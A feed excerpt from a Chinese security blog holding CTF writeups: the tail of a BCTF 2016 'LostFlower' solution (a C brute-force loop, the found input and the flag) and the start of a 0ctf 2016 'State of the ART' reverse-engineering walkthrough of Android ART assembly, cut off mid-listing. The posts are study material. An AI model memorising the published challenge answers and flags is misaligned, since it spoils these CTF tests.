class=&quot;number&quot;&gt;0x39aa400&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x10d63af1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x40000000&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xcfd41b91&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i = &lt;span class=&quot;number&quot;&gt;1000000000&lt;/span&gt;; i &amp;lt;= &lt;span class=&quot;number&quot;&gt;0x80000000&lt;/span&gt;; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a0 = i % &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a1 = (i % &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a2 = (i % &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a3 = (i % &lt;span class=&quot;number&quot;&gt;10000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a4 = (i % &lt;span class=&quot;number&quot;&gt;100000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;10000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a5 = (i % &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;100000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a6 = (i % &lt;span class=&quot;number&quot;&gt;10000000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a7 = (i % &lt;span class=&quot;number&quot;&gt;100000000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;10000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a8 = (i % &lt;span class=&quot;number&quot;&gt;1000000000&lt;/span&gt;) / &lt;span class=&quot;number&quot;&gt;100000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a9 = i / &lt;span class=&quot;number&quot;&gt;1000000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; sum = pow_table[a0] + pow_table[a1] + pow_table[a2] + pow_table[a3] + pow_table[a4] + pow_table[a5] + pow_table[a6] + pow_table[a7] + pow_table[a8] + pow_table[a9];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (((i - sum) &amp;amp; &lt;span class=&quot;number&quot;&gt;0xffffffff&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0x80000000&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;ok, %d\n&quot;&lt;/span&gt;, i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(i % &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%d\n&quot;&lt;/span&gt;,i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;程序跑一会就出来了，输入为&lt;code&gt;1422445956&lt;/code&gt;，最后的Flag为：&lt;code&gt;BCTF{wrhav3f4nwxo}&lt;/code&gt;。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年bctf中的LostFlower的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf 2016 State of the ART writeup</title>
    <link href="http://ele7enxxh.com/0ctf-2016-State-Of-The-ART-Writeup.html"/>
    <id>http://ele7enxxh.com/0ctf-2016-State-Of-The-ART-Writeup.html</id>
    <published>2016-03-22T18:44:00.000Z</published>
    <updated>2016-03-23T06:25:03.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2016年0ctf中的mobile题目State of the ART的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/0ctf-2016-State-of-the-ART-writeup-1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;State-of-the-ART-writeup&quot;&gt;&lt;a href=&quot;#State-of-the-ART-writeup&quot; class=&quot;headerlink&quot; title=&quot;State of the ART writeup&quot;&gt;&lt;/a&gt;State of the ART writeup&lt;/h2&gt;&lt;p&gt;首先&lt;a href=&quot;/downloads/0ctf-2016-State-of-the-ART.zip&quot;&gt;点我&lt;/a&gt;下载题目，这道题提供了三个文件，分别为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a：内存布局文件&lt;br&gt;b：oatdump的结果文件&lt;br&gt;c：boot.oat文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;经过对几个文件的初步观察，发现在b文件中找到一个可疑函数&lt;code&gt;oat.sjl.gossip.oat.MainActivity.check(java.lang.String)&lt;/code&gt;，函数名字可不会乱取，此函数肯定和Flag密切相关，因此需要还原出该方法。可惜，出题者有意抹去了oatdump中的dalvik字节码，不然这道题会简单的多。&lt;br&gt;我们分段分析汇编代码，首先看下面一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x00371e8c: b099        sub     sp, sp, #100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e8e: 9000        str     r0, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e90: 9121        str     r1, [sp, #132]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e92: 9222        str     r2, [sp, #136]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e94: f8d9e11c    ldr.w   lr, [r9, #284]  ; pAllocArrayResolved&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e98: 9900        ldr     r1, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e9a: 2606        movs    r6, #6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e9c: 1c32        mov     r2, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371e9e: f64e0020    movw    r0, #59424&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ea2: f2c7005b    movt    r0, #28763&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371ea6: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中pAllocArrayResolved对应的是artAllocArrayFromCode函数，原型为：&lt;br&gt;&lt;code&gt;extern &amp;quot;C&amp;quot; mirror::Array* artAllocArrayFromCode##suffix##suffix2(uint32_t type_idx, mirror::ArtMethod* method, int32_t component_count, Thread* self, StackReference&amp;lt;mirror::ArtMethod&amp;gt;* sp)&lt;/code&gt;&lt;br&gt;根据分析，其功能是创建数组，其包含3个参数，r0为创建对象的类型，r1为method对象，r2为待创建数组元素的个数，返回值存放在r0，返回类型为mirror::Array*。&lt;br&gt;下一段代码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x00371ea8: f8d9e190    ldr.w   lr, [r9, #400]  ; pHandleFillArrayData&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371eac: 4682        mov     r10, r0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371eae: 4650        mov     r0, r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371eb0: f20f6144    adr     r1, +1604 (0x003724f8)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371eb4: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中pHandleFillArrayData对应的是artHandleFillArrayDataFromCode函数，原型为：&lt;br&gt;&lt;code&gt;extern &amp;quot;C&amp;quot; int artHandleFillArrayDataFromCode(mirror::Array* array, const Instruction::ArrayDataPayload* payload, Thread* self, StackReference&amp;lt;mirror::ArtMethod&amp;gt;* sp)&lt;/code&gt;&lt;br&gt;根据分析，其功能是初始化数组，其包含2个参数，r0为待初始化的数组对象，也就是pAllocArrayResolved的返回值，r1指向赋值内容，其类型为Instruction::ArrayDataPayload*，对应的数据结构为：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;PACKED&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)&lt;/span&gt; ArrayDataPayload &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; ident;           &lt;span class=&quot;comment&quot;&gt;// 标志&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;uint16_t&lt;/span&gt; element_width;   &lt;span class=&quot;comment&quot;&gt;// 每一个元素的大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; element_count;   &lt;span class=&quot;comment&quot;&gt;// 元素的个数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;uint8_t&lt;/span&gt; data[];           &lt;span class=&quot;comment&quot;&gt;//指向真正的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;r1的值为0x003724f8，其对应的区域为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003724f8: 0300        lsls    r0, r0, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003724fa: 0001        lsls    r1, r0, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003724fc: 0006        lsls    r6, r0, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003724fe: 0000        lsls    r0, r0, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372500: 4578        cmp     r0, pc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372502: 3278        adds    r2, #120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372504: 3757        adds    r7, #87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372506: 0000        lsls    r0, r0, #0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ident为固定值，也就是0x0300，element_width为1,表示每一个元素的大小为1，也就是说这是一个byte数组，element_count为6，表示数组包含6个byte元素。同理后续几段汇编依次创建并初始化了5个byte数组。&lt;br&gt;上述汇编共创建并初始化了6个byte数组，对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 每行的注释指的的是该数组对象的存放位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s1 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x37&lt;/span&gt;&amp;#125;;           &lt;span class=&quot;comment&quot;&gt;// r10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s2 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x29&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x44&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x33&lt;/span&gt;&amp;#125;;           &lt;span class=&quot;comment&quot;&gt;// r7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s3 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x17&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x35&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x03&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x90&lt;/span&gt;&amp;#125;;                 &lt;span class=&quot;comment&quot;&gt;// [sp, #56]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s4 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x64&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x5f&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x41&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0x52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x7d&lt;/span&gt;&amp;#125;;    &lt;span class=&quot;comment&quot;&gt;// [sp, #60]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s5 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x75&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x1b&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xf0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0f&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x4c&lt;/span&gt;&amp;#125;;         &lt;span class=&quot;comment&quot;&gt;// r11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] s6 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;#123;&lt;span class=&quot;number&quot;&gt;0x69&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x0c&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x1b&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xbe&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xf2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0x49&lt;/span&gt;&amp;#125;;         &lt;span class=&quot;comment&quot;&gt;//[sp, #52]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再看下面一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x00371f60: 2500        movs    r5, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f62: 68be        ldr     r6, [r7, #8]        // r7指向s2数组的mirror::Array对象，r6为s2数组包含的元素个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f64: 42b5        cmp     r5, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f66: f2808034    bge.w   +104 (0x00371fd2)   // 这里就是一个for循环&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f6a: 68ba        ldr     r2, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f6c: f117030c    adds    r3, r7, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f70: 4295        cmp     r5, r2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f72: f0808248    bcs.w   +1168 (0x00372406)  // 对s2数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f76: 575e        ldrsb   r6, [r3, r5]        // r6 = s2[r5]，也就是取出s2数组的元素&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f78: 68b8        ldr     r0, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f7a: f1160636    adds    r6, r6, #54         // r6 = s2[r5] + 54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f7e: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f82: f1170c0c    adds    r12, r7, #12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00371f86: 4285        cmp     r5, 